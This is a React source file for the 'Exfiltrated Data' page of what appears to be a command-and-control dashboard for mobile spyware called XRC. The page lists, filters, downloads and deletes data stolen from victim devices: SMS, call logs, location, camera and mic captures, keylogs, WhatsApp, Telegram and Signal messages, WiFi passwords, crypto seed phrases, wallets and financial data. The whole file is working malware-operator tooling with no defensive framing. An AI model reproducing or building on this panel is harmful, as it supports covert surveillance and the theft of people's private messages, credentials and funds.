// ============================================================
// FILE: XRC/dashboard/src/pages/ExfilPage.tsx
// ============================================================
import { useEffect, useState } from 'react'
import { useExfilStore } from '@/stores/exfilStore'
import DataTable from '@/components/DataTable'
import { Database, RefreshCw, Download, Trash2, FileText, Image, FileSpreadsheet, Code } from 'lucide-react'
import { motion } from 'framer-motion'
import toast from 'react-hot-toast'

const typeIcons: Record<string, any> = {
  contacts: Smartphone,
  sms: FileText,
  call_logs: FileText,
  location: MapPin,
  screenshot: Image,
  camera: Image,
  mic: FileText,
  files: FileText,
  accounts: Code,
  clipboard: FileText,
  notifications: FileText,
  whatsapp: FileText,
  telegram: FileText,
  signal: FileText,
  keylog: FileText,
  browser_history: FileText,
  browser_bookmarks: FileText,
  wifi_passwords: Code,
  seed_phrase: Code,
  wallet: Code,
  finance: FileSpreadsheet,
}

import { Smartphone, MapPin } from 'lucide-react'

export default function ExfilPage() {
  const { items, isLoading, fetchExfil, downloadExfil, deleteExfil, totalCount, totalSize } = useExfilStore()
  const [typeFilter, setTypeFilter] = useState<string>('')
  const [deviceFilter, setDeviceFilter] = useState('')

  useEffect(() => {
    fetchExfil()
  }, [])

  const handleFilter = () => {
    fetchExfil(deviceFilter || undefined, typeFilter || undefined)
  }

  const columns = [
    { key: 'received_at', label: 'Received', sortable: true,
      render: (item: any) => (
        <span className="text-xs text-xrc-text-muted mono">{new Date(item.received_at * 1000).toLocaleString()}</span>
      )
    },
    { key: 'device_id', label: 'Device', sortable: true,
      render: (item: any) => <span className="mono text-xs">{item.device_id.slice(0, 16)}</span>
    },
    { key: 'type', label: 'Type', sortable: true,
      render: (item: any) => {
        const Icon = typeIcons[item.type] || Database
        return (
          <span className="flex items-center gap-1.5">
            <Icon className="w-3.5 h-3.5 text-xrc-cyan" />
            <span>{item.type}</span>
          </span>
        )
      }
    },
    { key: 'file_size', label: 'Size', sortable: true,
      render: (item: any) => {
        if (!item.file_size) return '-'
        const bytes = parseInt(item.file_size)
        if (bytes < 1024) return `${bytes} B`
        if (bytes < 1024 * 1024) return `${(bytes / 1024).toFixed(1)} KB`
        return `${(bytes / (1024 * 1024)).toFixed(1)} MB`
      }
    },
    { key: 'captured_at', label: 'Captured', sortable: true,
      render: (item: any) => (
        <span className="text-xs text-xrc-text-muted">{new Date(item.captured_at * 1000).toLocaleString()}</span>
      )
    },
    { key: 'actions', label: 'Actions',
      render: (item: any) => (
        <div className="flex items-center gap-2">
          <button
            onClick={(e) => { e.stopPropagation(); downloadExfil(item.id) }}
            className="p-1.5 text-xrc-cyan hover:bg-xrc-cyan/10 rounded transition-colors"
            title="Download"
          >
            <Download className="w-4 h-4" />
          </button>
          <button
            onClick={(e) => { e.stopPropagation(); deleteExfil(item.id); toast.success('Deleted') }}
            className="p-1.5 text-xrc-crimson hover:bg-xrc-crimson/10 rounded transition-colors"
            title="Delete"
          >
            <Trash2 className="w-4 h-4" />
          </button>
        </div>
      )
    },
  ]

  return (
    <motion.div initial={{ opacity: 0 }} animate={{ opacity: 1 }} className="space-y-6">
      <div className="flex items-center justify-between">
        <div>
          <h1 className="text-2xl font-bold text-white mono">Exfiltrated Data</h1>
          <p className="text-xrc-text-muted text-sm mt-1">
            {totalCount} items · {(totalSize / (1024 * 1024)).toFixed(1)} MB
          </p>
        </div>
        <button onClick={() => fetchExfil()} className="btn-outline flex items-center gap-2" disabled={isLoading}>
          <RefreshCw className={`w-4 h-4 ${isLoading ? 'animate-spin' : ''}`} />
          Refresh
        </button>
      </div>

      {/* Filters */}
      <div className="glass-card p-4">
        <div className="flex items-center gap-3 flex-wrap">
          <input
            type="text"
            placeholder="Filter by device ID..."
            value={deviceFilter}
            onChange={(e) => setDeviceFilter(e.target.value)}
            className="input-field flex-1 max-w-xs"
          />
          <select
            value={typeFilter}
            onChange={(e) => setTypeFilter(e.target.value)}
            className="input-field"
          >
            <option value="">All types</option>
            <option value="contacts">Contacts</option>
            <option value="sms">SMS</option>
            <option value="call_logs">Call Logs</option>
            <option value="location">Location</option>
            <option value="screenshot">Screenshots</option>
            <option value="camera">Camera</option>
            <option value="mic">Mic Recordings</option>
            <option value="files">Files</option>
            <option value="accounts">Accounts</option>
            <option value="clipboard">Clipboard</option>
            <option value="notifications">Notifications</option>
            <option value="whatsapp">WhatsApp</option>
            <option value="telegram">Telegram</option>
            <option value="signal">Signal</option>
            <option value="keylog">Keylog</option>
            <option value="browser_history">Browser History</option>
            <option value="browser_bookmarks">Browser Bookmarks</option>
            <option value="wifi_passwords">WiFi Passwords</option>
            <option value="seed_phrase">Seed Phrases</option>
            <option value="wallet">Wallets</option>
            <option value="finance">Financial Data</option>
          </select>
          <button onClick={handleFilter} className="btn-cyan text-sm">Apply</button>
        </div>
      </div>

      {/* Data table */}
      <div className="glass-card p-5">
        <DataTable
          columns={columns}
          data={items}
          searchable
          searchKeys={['device_id', 'type', 'tags']}
          pageSize={20}
          emptyMessage="No exfiltrated data yet"
        />
      </div>
    </motion.div>
  )
}
